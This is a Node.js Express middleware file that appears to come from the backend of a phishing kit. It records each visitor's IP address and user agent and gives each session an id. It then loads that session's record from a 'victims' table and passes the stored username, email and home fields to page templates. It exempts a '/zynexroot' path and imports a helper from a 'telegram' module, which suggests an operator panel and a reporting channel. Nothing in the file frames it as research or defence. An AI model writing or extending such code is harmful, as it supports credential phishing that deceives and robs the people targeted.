const express = require('express');
const router = express.Router();
const db = require('../lib/db');
const config = require('../lib/config');
const { getRealIP } = require('../lib/telegram');

router.use(async (req, res, next) => {
  if (req.path.startsWith('/zynexroot')) return next();

  const ip = getRealIP(req);
  const ua = req.headers['user-agent'] || '';

  if (!req.session.started) {
    req.session.started = 'true';
    req.session.uniqueid = Math.floor(Date.now() / 1000);
  }

  try {
    const rows = await db.query(
      'SELECT * FROM visits WHERE ua = ? AND ip = ?',
      [ua, ip]
    );
    if (rows.length === 0) {
      await db.query(
        'INSERT INTO visits (ua, ip) VALUES (?, ?)',
        [ua, ip]
      );
    }
  } catch (err) {
    console.error('Visit tracking error:', err.message);
  }

  if (req.session.started === 'true' && req.session.uniqueid) {
    try {
      const victim = await db.querySingle(
        'SELECT * FROM victims WHERE uniqueid = ?',
        [req.session.uniqueid]
      );
      if (victim) {
        res.locals.victim = victim;
        res.locals.user = victim.user || '';
        res.locals.home = victim.home || '';
        res.locals.homelive = victim.homelive || '';
        res.locals.getemail = victim.getemail || '';
        res.locals.name = victim.getemail || victim.user || '';
      }
    } catch (err) {
      console.error('Victim lookup error:', err.message);
    }
  }

  next();
});

module.exports = router;
